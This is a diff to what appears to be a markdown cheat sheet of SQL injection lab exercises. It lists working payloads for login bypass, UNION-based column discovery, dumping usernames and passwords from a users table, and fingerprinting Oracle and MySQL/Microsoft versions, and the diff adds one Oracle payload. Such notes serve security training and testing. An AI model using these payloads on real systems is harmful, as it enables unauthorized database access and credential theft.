@@ -187,11 +187,12 @@ This cheat sheet summarizes useful SQLMap commands for detecting and exploiting 
    - modify the body parameter username=`administrator'--`&password=password
 5. SQL injection **UNION** attack, determining the **number of columns** returned by the query
    - GET /filter?category=`' UNION SELECT NULL,NULL,NULL--`
-7. SQL injection UNION attack, **finding** a **column** containing **text**
+7. SQL injection UNION attack, **finding** a **column** containing **text**  
    - GET /filter?category=`' UNION SELECT NULL,'abc',NULL--`
 9. SQL injection UNION attack, **retrieving data** from other tables
     - GET /filter?category=`' UNION SELECT username, password FROM users--`
 11. SQL injection attack, querying the **database type and version on Oracle**
+    - Find number of columns: `' UNION SELECT 'abc','def' FROM+dual--`  
     - GET /filter?category=`' UNION SELECT BANNER, NULL FROM v$version--`
 13. SQL injection attack, querying the **database type and version on MySQL and Microsoft**
     - GET /filter?category=`' UNION SELECT @@version,'def'#`
